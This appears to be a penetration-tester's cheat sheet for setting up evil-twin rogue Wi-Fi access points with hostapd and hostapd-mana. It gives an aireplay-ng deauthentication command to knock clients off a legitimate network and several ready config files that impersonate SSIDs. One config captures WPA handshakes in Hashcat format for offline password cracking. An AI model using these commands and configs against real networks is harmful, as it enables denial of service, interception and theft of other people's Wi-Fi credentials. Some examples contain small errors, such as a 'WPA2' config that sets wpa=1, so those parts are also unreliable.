## Creating a Rogue AP
Evil twins can be in any channel, except if we clone the BSSID of the AP we want to impersonate, in which case the channel must be different. But APs with different BSSID and equal ESSID can coexist in the same channel.

If we get a connection in an evil twin, the connected client won't have internet access if we don't give him an IP with a dhcp server.

<font color=red>with hostapd, we need to be listening with airodump (on another wifi interface) at the same time that we host the fake ap, to capture handshakes of clients that try to connect to us, despite the PSK mismatch (since we don't know the real PSK but will crack it from their handshake to us)</font>

Deauth a client if he doesn't connect to our AP
``sudo aireplay-ng --deauth 4 -a <bssid> -c <client_MAC> wlan0mon``

### hostapd / hostapd-mana
hostapd-mana is an enhanced version of hostapd. Both are used for hosting fake APs, but mana includes more options to do things like dump passwords obtained from the handshake. Hostapd-mana can read hostapd config files, but also includes other options 

Install
```bash
sudo apt install hostapd-mana
sudo apt install hostapd-mana
```

Run
```bash
hostapd a.conf
hostapd-mana a.conf
```

Parameters: 
- ``driver=nl80211``  -> always the same for all linux devices
- ``hw_mode=g`` -> 2.4 GHz  y 54 Mb
- auth_algs (this is for WEP, for WPA use the equivalent ``wpa`` parameter-> 
	- ``auth_algs=0`` ->OPEN
	- ``auth_algs=1`` ->WEP
	- ``auth_algs=2`` -> Both
- ``wep_key0`` <- we can use up to 4
- Type of security
	- ``wpa=3`` -> activate both WPA and WPA2
	- ``wpa=2`` -> activate only WPA2
	- ``wpa=1`` -> activate only WPA

Type of authentication:
- ``wpa_key_mgmt=WPA-PSK``
- ``wpa_passphrase=<passphrase>`` -> passphrase in the case of PSK auth, we can set anything here, we don't care it's wrong

Encryption type (if the target is exclusiveliy WPA1 or WPA2 use just one of the following):
- ``wpa_pairwise=TKIP CCMP`` -> TKIP or CCMP encryption with WAP1
- ``rsn_pairwise=TKIP CCMP`` -> TKIP or CCMP encryption with WPA2

- ``mana_wpaout``-> where to save the captured handshakes (in a Hashcat hccapx format). 

#### hostap with  no encryption
```
interface=wlan1
ssid=hostel-A
hw_mode=g
channel=6
driver=nl80211
```

#### hostap with wep
```
interface=wlan1
hw_mode=g
channel=6
driver=nl80211
ssid=hostel-A
auth_algs=1
wep_default_key=0
wep_key0="54321"
```

#### hostap with WPA-PSK
```
interface=wlan1
hw_mode=g
channel=6
driver=nl80211
ssid=HomeAlone
auth_algs=1
wpa=1
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
wpa_passphrase=welcome@123
```

#### hostap with WPA2-PSK
```
interface=wlan1
hw_mode=g
channel=6
driver=nl80211
ssid=Lost-in-space
auth_algs=1
wpa=1
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_passphrase=beautifulsoup

# SSID 2
bss=wlan1_0
ssid=LOCOMO-Mobile-hotspot
auth_algs=1
wpa=1
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_passphrase=beautifulsoup
```

alternative
```
interface=wlan1
hw_mode=g
channel=6
driver=nl80211

ssid=Lost-in-space
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=beautifulsoup
```

#### Hosting several APs
Two different ESSIDs with the same wifi antenna (interface wlan1). With hostap, if we want to simulate several ESSIDs, the first one must use the keyword "interface" and the real interface name, and the next ones use the keyword "bss" and we use fictitious names, like wlan1_0. This can be used if a client probes different clients.
```
# SSID 1
interface=wlan1
driver=nl80211
ssid=dex-net
wpa=2
wpa_passphrase=123456789
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
channel=1

# SSID 2
bss=wlan1_0
ssid=dex-network
wpa=2
wpa_passphrase=123456789
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
channel=1
```


```
interface=wlan0
ssid=<ESSID>
channel=1
hw_mode=g
ieee80211n=1
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP
rsn_pairwise=TKIP CCMP
mana_wpaout=/home/kali/output.hccapx
```
